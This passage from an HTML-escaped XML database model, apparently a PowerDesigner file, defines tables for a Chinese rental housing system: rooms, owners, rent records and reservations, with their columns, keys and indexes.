Id=&quot;o42&quot;&gt;&lt;a:ObjectID&gt;07A1757C-687F-47AD-B8D5-E8116C93BEC1&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋编号&lt;/a:Name&gt;&lt;a:Code&gt;RoomNum&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333340&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;CA5EC088-340A-45A7-B4CE-072241623902&#125;DAT 1618333034ORG &#123;C41A4BC7-929F-4BB9-BFDA-78B0883BC246&#125;DAT 1618325546ATT DTTPATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;SERIAL&lt;/a:DataType&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;o:Column Id=&quot;o43&quot;&gt;&lt;a:ObjectID&gt;15D6521F-6BE2-42F2-AA5A-826A37E38944&lt;/a:ObjectID&gt;&lt;a:Name&gt;房主身份证号&lt;/a:Name&gt;&lt;a:Code&gt;OwnerIDNum&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333340&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;1661FC83-5F0F-4422-9516-3147918A8D1E&#125;DAT 1618333034ORG &#123;5C62BF98-5A88-45D6-908F-575BE93621A6&#125;,&#123;EAB9668A-ADFE-4355-822B-2AAAEBE5E1E1&#125;DAT 1618325546ATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;VARCHAR(18)&lt;/a:DataType&gt;&lt;a:Length&gt;18&lt;/a:Length&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;o:Column Id=&quot;o44&quot;&gt;&lt;a:ObjectID&gt;4CD4387D-2586-4421-B36B-5D5D2AA59A7C&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋地址&lt;/a:Name&gt;&lt;a:Code&gt;RoomAddr&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333340&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;EFA37846-F443-4FC1-AD1B-2BAEA2725085&#125;DAT 1618333034ORG &#123;FB014F6C-72FC-4D85-8E52-542C49888D04&#125;DAT 1618325546ATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;VARCHAR(20)&lt;/a:DataType&gt;&lt;a:Length&gt;20&lt;/a:Length&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;o:Column Id=&quot;o45&quot;&gt;&lt;a:ObjectID&gt;0949FB10-16CF-492D-B667-900F5A057A5C&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋类型&lt;/a:Name&gt;&lt;a:Code&gt;RoomType&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333340&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;74803FDB-D08B-4FAA-901F-D59A0138416C&#125;DAT 1618333034ORG &#123;0BAAB45F-E7FB-47E9-A278-62E6267EA336&#125;DAT 1618325546ATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;VARCHAR(20)&lt;/a:DataType&gt;&lt;a:Length&gt;20&lt;/a:Length&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;o:Column Id=&quot;o46&quot;&gt;&lt;a:ObjectID&gt;131ADCD5-29F9-46A9-8D5E-08B5EFF2A3E4&lt;/a:ObjectID&gt;&lt;a:Name&gt;每月基本房租&lt;/a:Name&gt;&lt;a:Code&gt;RoomPrice&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333340&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;98CAD049-F12D-4602-A467-12AA2AB936CD&#125;DAT 1618333034ORG &#123;19EE06BA-39BF-4617-A567-B720C2B86600&#125;DAT 1618325546ATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;MONEY&lt;/a:DataType&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;o:Column Id=&quot;o47&quot;&gt;&lt;a:ObjectID&gt;7A7BCF1F-C499-4AC4-B760-F29BA1FCFEEE&lt;/a:ObjectID&gt;&lt;a:Name&gt;是否空闲&lt;/a:Name&gt;&lt;a:Code&gt;Empty&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333340&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;A630B2B3-B09F-4ED0-98EF-11AED810E5A7&#125;DAT 1618333034ORG &#123;341C6E5B-5EC0-43B5-8BFF-E0D230BDBE25&#125;DAT 1618325546ATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;BOOL&lt;/a:DataType&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;/c:Columns&gt;&lt;c:Keys&gt;&lt;o:Key Id=&quot;o48&quot;&gt;&lt;a:ObjectID&gt;110C00C4-9960-48F5-A479-0FA75ED6E697&lt;/a:ObjectID&gt;&lt;a:Name&gt;Identifier_1&lt;/a:Name&gt;&lt;a:Code&gt;Identifier_1&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333033&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;984A4691-3504-4D86-9FE0-C98DB10E2752&#125;DAT 1618333034ORG &#123;F4555F5C-6216-4A26-9736-1CDF8EC09580&#125;DAT 1618325546&lt;/a:History&gt;&lt;c:Key.Columns&gt;&lt;o:Column Ref=&quot;o42&quot;/&gt;&lt;/c:Key.Columns&gt;&lt;/o:Key&gt;&lt;/c:Keys&gt;&lt;c:Indexes&gt;&lt;o:Index Id=&quot;o49&quot;&gt;&lt;a:ObjectID&gt;83FB9A08-FA62-4EA9-A78B-56E04F36CA03&lt;/a:ObjectID&gt;&lt;a:Name&gt;RoomInfo_PK&lt;/a:Name&gt;&lt;a:Code&gt;RoomInfo_PK&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:Unique&gt;1&lt;/a:Unique&gt;&lt;c:LinkedObject&gt;&lt;o:Key Ref=&quot;o48&quot;/&gt;&lt;/c:LinkedObject&gt;&lt;c:IndexColumns&gt;&lt;o:IndexColumn Id=&quot;o50&quot;&gt;&lt;a:ObjectID&gt;E123D458-B39E-4B51-BF20-2B3124E654C1&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Column&gt;&lt;o:Column Ref=&quot;o42&quot;/&gt;&lt;/c:Column&gt;&lt;/o:IndexColumn&gt;&lt;/c:IndexColumns&gt;&lt;/o:Index&gt;&lt;o:Index Id=&quot;o51&quot;&gt;&lt;a:ObjectID&gt;060F3F76-A796-4092-B1BA-76310139DF04&lt;/a:ObjectID&gt;&lt;a:Name&gt;拥有_FK&lt;/a:Name&gt;&lt;a:Code&gt;拥有_FK&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:LinkedObject&gt;&lt;o:Reference Ref=&quot;o15&quot;/&gt;&lt;/c:LinkedObject&gt;&lt;c:IndexColumns&gt;&lt;o:IndexColumn Id=&quot;o52&quot;&gt;&lt;a:ObjectID&gt;FC3325D7-F8F6-4E3E-81C7-886929976BDE&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Column&gt;&lt;o:Column Ref=&quot;o43&quot;/&gt;&lt;/c:Column&gt;&lt;/o:IndexColumn&gt;&lt;/c:IndexColumns&gt;&lt;/o:Index&gt;&lt;/c:Indexes&gt;&lt;c:PrimaryKey&gt;&lt;o:Key Ref=&quot;o48&quot;/&gt;&lt;/c:PrimaryKey&gt;&lt;/o:Table&gt;&lt;o:Table Id=&quot;o23&quot;&gt;&lt;a:ObjectID&gt;055F9E5A-B966-41CB-8DD7-53D0DD796B00&lt;/a:ObjectID&gt;&lt;a:Name&gt;房主信息&lt;/a:Name&gt;&lt;a:Code&gt;OnwerInfo&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333912&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;EF919B87-AF4E-41BB-B583-E804ABB7E916&#125;DAT 1618333034ORG &#123;BDD7FF53-7C2F-4368-850F-95499E1A03FD&#125;DAT 1618325546ATT CODE&lt;/a:History&gt;&lt;a:TotalSavingCurrency/&gt;&lt;c:Columns&gt;&lt;o:Column Id=&quot;o53&quot;&gt;&lt;a:ObjectID&gt;11DF1C60-5328-4837-9E6F-67E75CC5EB18&lt;/a:ObjectID&gt;&lt;a:Name&gt;房主身份证号&lt;/a:Name&gt;&lt;a:Code&gt;OwnerIDNum&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333383&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;CBE95EE6-ACB8-48B0-85BE-6E2FFDF2F578&#125;DAT 1618333034ORG &#123;5C62BF98-5A88-45D6-908F-575BE93621A6&#125;DAT 1618325546ATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;VARCHAR(18)&lt;/a:DataType&gt;&lt;a:Length&gt;18&lt;/a:Length&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;o:Column Id=&quot;o54&quot;&gt;&lt;a:ObjectID&gt;96DABCC8-B717-4F11-93CA-285BB0C9A12F&lt;/a:ObjectID&gt;&lt;a:Name&gt;房主姓名&lt;/a:Name&gt;&lt;a:Code&gt;OwnerName&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333383&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;E8F77781-36D2-4CCF-A2D9-7D8EEA976154&#125;DAT 1618333034ORG &#123;E57AA531-274B-4A22-BDB2-9A52917C1A3C&#125;DAT 1618325546ATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;VARCHAR(20)&lt;/a:DataType&gt;&lt;a:Length&gt;20&lt;/a:Length&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;o:Column Id=&quot;o55&quot;&gt;&lt;a:ObjectID&gt;3BA778B7-2152-4798-825B-4056FD460974&lt;/a:ObjectID&gt;&lt;a:Name&gt;房主电话&lt;/a:Name&gt;&lt;a:Code&gt;OwnerTel&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333383&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;4D92CDC9-0F32-41F9-8240-ECC639FA7D99&#125;DAT 1618333034ORG &#123;081D5BD8-20C5-4545-8943-2D4E9F897AE7&#125;DAT 1618325546ATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;VARCHAR(11)&lt;/a:DataType&gt;&lt;a:Length&gt;11&lt;/a:Length&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;/c:Columns&gt;&lt;c:Keys&gt;&lt;o:Key Id=&quot;o56&quot;&gt;&lt;a:ObjectID&gt;B4D53539-4F3E-457D-9BB6-9DF770DC6EA8&lt;/a:ObjectID&gt;&lt;a:Name&gt;Identifier_1&lt;/a:Name&gt;&lt;a:Code&gt;Identifier_1&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333033&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;1162082B-05E6-45CC-8D3F-55365DB024AE&#125;DAT 1618333034ORG &#123;3AF588EE-A26C-4BC1-9E65-DC4B4985582B&#125;DAT 1618325546&lt;/a:History&gt;&lt;c:Key.Columns&gt;&lt;o:Column Ref=&quot;o53&quot;/&gt;&lt;/c:Key.Columns&gt;&lt;/o:Key&gt;&lt;/c:Keys&gt;&lt;c:Indexes&gt;&lt;o:Index Id=&quot;o57&quot;&gt;&lt;a:ObjectID&gt;F8D1F243-E153-4E3A-AD6F-4746E35328A2&lt;/a:ObjectID&gt;&lt;a:Name&gt;房主信息_PK&lt;/a:Name&gt;&lt;a:Code&gt;房主信息_PK&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:Unique&gt;1&lt;/a:Unique&gt;&lt;c:LinkedObject&gt;&lt;o:Key Ref=&quot;o56&quot;/&gt;&lt;/c:LinkedObject&gt;&lt;c:IndexColumns&gt;&lt;o:IndexColumn Id=&quot;o58&quot;&gt;&lt;a:ObjectID&gt;3AE431F5-4798-4EB7-8D7B-711B14460CBE&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Column&gt;&lt;o:Column Ref=&quot;o53&quot;/&gt;&lt;/c:Column&gt;&lt;/o:IndexColumn&gt;&lt;/c:IndexColumns&gt;&lt;/o:Index&gt;&lt;/c:Indexes&gt;&lt;c:PrimaryKey&gt;&lt;o:Key Ref=&quot;o56&quot;/&gt;&lt;/c:PrimaryKey&gt;&lt;/o:Table&gt;&lt;o:Table Id=&quot;o24&quot;&gt;&lt;a:ObjectID&gt;E9C4F9F2-8117-4C2C-86E6-74A7F6DDB3A1&lt;/a:ObjectID&gt;&lt;a:Name&gt;租用记录&lt;/a:Name&gt;&lt;a:Code&gt;RentRecord&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333944&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;E86BB117-FE30-4626-8D6A-43968DEDBF08&#125;DAT 1618333034ORG &#123;A8F60995-E16F-403E-AEFB-70370F8C286A&#125;DAT 1618325546ATT CODE&lt;/a:History&gt;&lt;a:TotalSavingCurrency/&gt;&lt;c:Columns&gt;&lt;o:Column Id=&quot;o59&quot;&gt;&lt;a:ObjectID&gt;B14FC480-CA0A-49E9-82AD-E66FFA20BC64&lt;/a:ObjectID&gt;&lt;a:Name&gt;租用流水号&lt;/a:Name&gt;&lt;a:Code&gt;RentNum&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333528&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;1C0360C4-9C6F-41A1-9E37-36B6E21DFAC1&#125;DAT 1618333034ORG &#123;3840185E-0793-49E6-AF26-86AFB08D6295&#125;DAT 1618325546ATT DTTPATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;SERIAL&lt;/a:DataType&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;o:Column Id=&quot;o60&quot;&gt;&lt;a:ObjectID&gt;C4F25FF3-17A4-489F-9512-E753CF6F6A18&lt;/a:ObjectID&gt;&lt;a:Name&gt;租客身份证号&lt;/a:Name&gt;&lt;a:Code&gt;RenterIDNum&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333528&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;A18EE4DB-AC3F-4EE4-9078-A6D655EC0D3E&#125;DAT 1618333034ORG &#123;4AFE59F8-46B5-4D94-9E36-D1C0C6A93550&#125;,&#123;40788EEB-C543-4C66-8BC9-4C0CE4D0A1B2&#125;DAT 1618325546ATT NAMEATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;VARCHAR(18)&lt;/a:DataType&gt;&lt;a:Length&gt;18&lt;/a:Length&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;o:Column Id=&quot;o61&quot;&gt;&lt;a:ObjectID&gt;ACB6A7A1-61FA-4471-9359-A76D324F088F&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋编号&lt;/a:Name&gt;&lt;a:Code&gt;RoomNum&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333528&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;6805B1D7-CF61-4125-92E0-F009F777C701&#125;DAT 1618333034ORG &#123;C41A4BC7-929F-4BB9-BFDA-78B0883BC246&#125;,&#123;B74ABDAE-7F8E-4DAA-BECE-67686B380E54&#125;DAT 1618325546ATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;INT4&lt;/a:DataType&gt;&lt;a:Length&gt;4&lt;/a:Length&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;o:Column Id=&quot;o62&quot;&gt;&lt;a:ObjectID&gt;A54761B9-1CEC-4BB2-9DE6-5C5D21B01B2D&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋租用时间&lt;/a:Name&gt;&lt;a:Code&gt;RoomRentTime&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333528&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;9F13D567-7EA5-4065-A065-8E8DFC666691&#125;DAT 1618333034ORG &#123;16C1834F-749B-4CBC-87BB-34D791C4BC51&#125;DAT 1618325546ATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;DATE&lt;/a:DataType&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;o:Column Id=&quot;o63&quot;&gt;&lt;a:ObjectID&gt;EB1B657A-8434-4800-835D-E1A511BCFD80&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋到期时间&lt;/a:Name&gt;&lt;a:Code&gt;RoomDeadlin&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333528&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;9446978F-9C5B-4103-A6CA-589CB856D7E5&#125;DAT 1618333034ORG &#123;23C95933-4790-4780-BCBE-99A70D53756E&#125;DAT 1618325546ATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;DATE&lt;/a:DataType&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;/c:Columns&gt;&lt;c:Keys&gt;&lt;o:Key Id=&quot;o64&quot;&gt;&lt;a:ObjectID&gt;C6287D2B-D04C-4120-AAE0-C69B2AD781F2&lt;/a:ObjectID&gt;&lt;a:Name&gt;Identifier_1&lt;/a:Name&gt;&lt;a:Code&gt;Identifier_1&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333592&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;D99EC3B4-7A68-445B-B441-BC196027357E&#125;DAT 1618333034ORG &#123;0AC0CBDB-7ACA-4862-8171-53CF31A83543&#125;DAT 1618325546&lt;/a:History&gt;&lt;c:Key.Columns&gt;&lt;o:Column Ref=&quot;o59&quot;/&gt;&lt;/c:Key.Columns&gt;&lt;/o:Key&gt;&lt;/c:Keys&gt;&lt;c:Indexes&gt;&lt;o:Index Id=&quot;o65&quot;&gt;&lt;a:ObjectID&gt;EDEAAE3A-3E98-4FA2-BF1F-CC3FCEACB446&lt;/a:ObjectID&gt;&lt;a:Name&gt;租用记录_PK&lt;/a:Name&gt;&lt;a:Code&gt;租用记录_PK&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333592&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:Unique&gt;1&lt;/a:Unique&gt;&lt;c:LinkedObject&gt;&lt;o:Key Ref=&quot;o64&quot;/&gt;&lt;/c:LinkedObject&gt;&lt;c:IndexColumns&gt;&lt;o:IndexColumn Id=&quot;o66&quot;&gt;&lt;a:ObjectID&gt;640ED1AE-7802-4F12-AA5F-C229A1258249&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Column&gt;&lt;o:Column Ref=&quot;o59&quot;/&gt;&lt;/c:Column&gt;&lt;/o:IndexColumn&gt;&lt;/c:IndexColumns&gt;&lt;/o:Index&gt;&lt;o:Index Id=&quot;o67&quot;&gt;&lt;a:ObjectID&gt;2786576E-6FED-433B-9CE7-0B79A2873B46&lt;/a:ObjectID&gt;&lt;a:Name&gt;租用1_FK&lt;/a:Name&gt;&lt;a:Code&gt;租用1_FK&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:LinkedObject&gt;&lt;o:Reference Ref=&quot;o9&quot;/&gt;&lt;/c:LinkedObject&gt;&lt;c:IndexColumns&gt;&lt;o:IndexColumn Id=&quot;o68&quot;&gt;&lt;a:ObjectID&gt;EC6D1520-5C57-46F0-9BC2-C95E8350E24B&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Column&gt;&lt;o:Column Ref=&quot;o60&quot;/&gt;&lt;/c:Column&gt;&lt;/o:IndexColumn&gt;&lt;/c:IndexColumns&gt;&lt;/o:Index&gt;&lt;o:Index Id=&quot;o69&quot;&gt;&lt;a:ObjectID&gt;BBE7A7A0-56BD-4661-A4E7-FFC15D636FD7&lt;/a:ObjectID&gt;&lt;a:Name&gt;租用2_FK&lt;/a:Name&gt;&lt;a:Code&gt;租用2_FK&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:LinkedObject&gt;&lt;o:Reference Ref=&quot;o12&quot;/&gt;&lt;/c:LinkedObject&gt;&lt;c:IndexColumns&gt;&lt;o:IndexColumn Id=&quot;o70&quot;&gt;&lt;a:ObjectID&gt;78BFE3EA-0006-43E2-9D9F-8D947E2EFE36&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Column&gt;&lt;o:Column Ref=&quot;o61&quot;/&gt;&lt;/c:Column&gt;&lt;/o:IndexColumn&gt;&lt;/c:IndexColumns&gt;&lt;/o:Index&gt;&lt;/c:Indexes&gt;&lt;c:PrimaryKey&gt;&lt;o:Key Ref=&quot;o64&quot;/&gt;&lt;/c:PrimaryKey&gt;&lt;/o:Table&gt;&lt;o:Table Id=&quot;o25&quot;&gt;&lt;a:ObjectID&gt;FE54D289-065A-414E-AFFC-B0B223180F89&lt;/a:ObjectID&gt;&lt;a:Name&gt;预定&lt;/a:Name&gt;&lt;a:Code&gt;Reserve&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618381164&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;18E366E1-5EF1-4DA5-82EF-C03D77659F1B&#125;DAT 1618333034ORG &#123;D4FD4412-8743-4AEA-B773-42465813A721&#125;DAT 1618325546ATT CODE&lt;/a:History&gt;&lt;a:TotalSavingCurrency/&gt;&lt;c:Columns&gt;&lt;o:Column Id=&quot;o71&quot;&gt;&lt;a:ObjectID&gt;49896D34-5285-4BDF-8A9F-B0A35A91F50B&lt;/a:ObjectID&gt;&lt;a:Name&gt;预定流水号&lt;/a:Name&gt;&lt;a:Code&gt;ReserveNum&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618381138&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618381164&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:DataType&gt;SERIAL&lt;/a:DataType&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;o:Column 